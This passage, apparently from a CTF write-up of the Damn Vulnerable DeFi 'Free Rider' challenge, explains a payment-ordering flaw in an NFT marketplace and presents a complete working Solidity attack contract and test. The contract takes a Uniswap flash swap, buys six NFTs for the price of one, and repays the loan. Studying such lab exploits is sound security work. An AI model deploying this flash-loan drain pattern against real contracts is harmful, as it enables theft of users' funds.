@@ -658,3 +658,184 @@ it('Exploit', async function () {
   });
 });
 ```
+
+## 10 - Free Rider
+
+Alright, stepping up in complexity with this challenge just a litle bit. Let's see, we have 2 contracts: **FreeRiderNFTMarketplace.sol** and **FreeRiderBuyer.sol**. The goal is to buy 6 listed NFTs. So, once we buy them we will be rewarded with 45 ETH. Each NFT costs 15 ETH and our starting balance is 0.5 ETH.
+
+First thing that comes to mind is flash loan of course. But it can't work because we won't be able to repay the loan even if we get the 45 ETH reward since all NFTs will cost 90 ETH. Or no? Let's see `_buyOne` function:
+
+```solidity
+  function _buyOne(uint256 tokenId) private {
+      uint256 priceToPay = offers[tokenId];
+      require(priceToPay > 0, "Token is not being offered");
+
+      require(msg.value >= priceToPay, "Amount paid is not enough");
+
+      amountOfOffers--;
+
+      // transfer from seller to buyer
+      token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);
+
+      // pay seller
+      payable(token.ownerOf(tokenId)).sendValue(priceToPay);
+
+      emit NFTBought(msg.sender, tokenId, priceToPay);
+  }
+```
+
+You could notice that contract pays the seller **after** it transfers NFT. That's wrong, basically it gives back money to buyer. We can easily exploit this, in `buyMany` which essentially calls `_buyOne` many times. We can call it for all 6 NFTs at once. All we need to do is to supply 15 ETH to pass first requirement:
+
+```solidity
+require(msg.value >= priceToPay, "Amount paid is not enough");
+```
+
+We'll be able to repay the flash loan since we got NFTs for free basically, the only thing we need to be careful about is to correctly convert WETH to ETH and vice versa since our UniSwapV2 pool offers only WETH. We will make new **FreeRiderAttack.sol** contract that will perform this attack. First we borrow the loan in WETH, then convert it to ETH and buy 6 NFTs "for free". Once we have NFTs, we transfer them to **FreeRiderBuyer.sol** to get the reward and all we need to do is to convert enough ETH to WETH to repay the loan.
+
+Solution code:
+
+**FreeRiderAttack.sol**
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+import "../free-rider/FreeRiderNFTMarketplace.sol";
+import "../DamnValuableNFT.sol";
+
+contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
+    using Address for address;
+
+    address payable immutable weth;
+    address immutable dvt;
+    address immutable factory;
+    address payable immutable buyerMarketplace;
+    address immutable buyer;
+    address immutable nft;
+
+    constructor(
+        address payable _weth,
+        address _factory,
+        address _dvt,
+        address payable _buyerMarketplace,
+        address _buyer,
+        address _nft
+    ) {
+        weth = _weth;
+        dvt = _dvt;
+        factory = _factory;
+        buyerMarketplace = _buyerMarketplace;
+        buyer = _buyer;
+        nft = _nft;
+    }
+
+    function flashSwap(address _tokenBorrow, uint256 _amount) external {
+        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
+        require(pair != address(0), "!pair init");
+
+        address token0 = IUniswapV2Pair(pair).token0();
+        address token1 = IUniswapV2Pair(pair).token1();
+
+        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
+        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;
+
+        bytes memory data = abi.encode(_tokenBorrow, _amount);
+
+        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external override {
+        address token0 = IUniswapV2Pair(msg.sender).token0();
+        address token1 = IUniswapV2Pair(msg.sender).token1();
+        address pair = IUniswapV2Factory(factory).getPair(token0, token1);
+
+        require(msg.sender == pair, "!pair");
+        require(sender == address(this), "!sender");
+
+        (address tokenBorrow, uint256 amount) = abi.decode(
+            data,
+            (address, uint256)
+        );
+
+        uint256 fee = ((amount * 3) / 997) + 1;
+        uint256 amountToRepay = amount + fee;
+
+        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));
+
+        tokenBorrow.functionCall(
+            abi.encodeWithSignature("withdraw(uint256)", currBal)
+        );
+
+        uint256[] memory tokenIds = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            tokenIds[i] = i;
+        }
+
+        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: 15 ether}(
+            tokenIds
+        );
+
+        for (uint256 i = 0; i < 6; i++) {
+            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
+        }
+
+        (bool success, ) = weth.call{value: 15.1 ether}("");
+        require(success, "failed to deposit weth");
+
+        IERC20(tokenBorrow).transfer(pair, amountToRepay);
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+```
+
+**free-rider.challenge.js**
+
+```js
+it('Exploit', async function () {
+  /** CODE YOUR EXPLOIT HERE */
+  const attackWeth = this.weth.connect(attacker);
+  const attackToken = this.token.connect(attacker);
+  const attackFactory = this.uniswapFactory.connect(attacker);
+  const attackMarketplace = this.marketplace.connect(attacker);
+  const attackBuyer = this.buyerContract.connect(attacker);
+  const attackNft = this.nft.connect(attacker);
+
+  const AttackFactory = await ethers.getContractFactory(
+    'FreeRiderAttack',
+    attacker
+  );
+  const attackContract = await AttackFactory.deploy(
+    attackWeth.address,
+    attackFactory.address,
+    attackToken.address,
+    attackMarketplace.address,
+    attackBuyer.address,
+    attackNft.address
+  );
+
+  await attackContract.flashSwap(attackWeth.address, NFT_PRICE, {
+    gasLimit: 1e6,
+  });
+});
+```
